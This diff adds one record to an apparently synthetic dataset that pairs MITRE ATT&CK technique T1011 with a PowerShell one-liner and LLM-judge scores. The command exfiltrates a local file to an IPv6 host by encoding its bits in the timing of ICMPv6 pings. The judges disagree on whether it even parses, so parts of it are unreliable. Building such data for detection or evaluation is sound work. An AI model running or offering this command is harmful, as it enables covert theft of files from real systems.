@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
+  "explanation": "Uses a timing covert channel over ICMPv6: uniform payload echos are spaced with distinct delays to represent bit values, aligning with T1011.",
+  "rationale_steps": [
+    "Convert bytes to bit strings.",
+    "Send a constant-size ICMPv6 echo per bit.",
+    "Delay intervals encode 0/1 so a receiver can reconstruct data by observing arrival timing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-1ebf45c5",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The command places an if statement directly in parentheses for the -Milliseconds argument instead of using a $() subexpression, which is likely to cause a parse error, though other syntax and quoting appear valid.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly exfiltrates via a timing covert channel over ICMPv6, this is not a different network medium (e.g., cellular, Wi‑Fi, Bluetooth) as required by T1011, so the technique alignment is incorrect.",
+        "combined_score": 2.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T01:19:06.600872Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct variable assignments, valid method calls, and proper control flow structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by exfiltrating data over IPv6 ICMP using a timing-based covert channel where bit values are encoded in the delay between ping packets, creating an alternative network medium for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:19:09.513744Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, using correct syntax for variable assignment, cmdlets, loops, and conditional statements, with all quotes, parentheses, and braces balanced.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements an ICMPv6 timing covert channel to exfiltrate data byte-by-byte, using appropriate PowerShell cmdlets and logic that fully aligns with the described technique and MITRE T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T06:28:52.002720Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
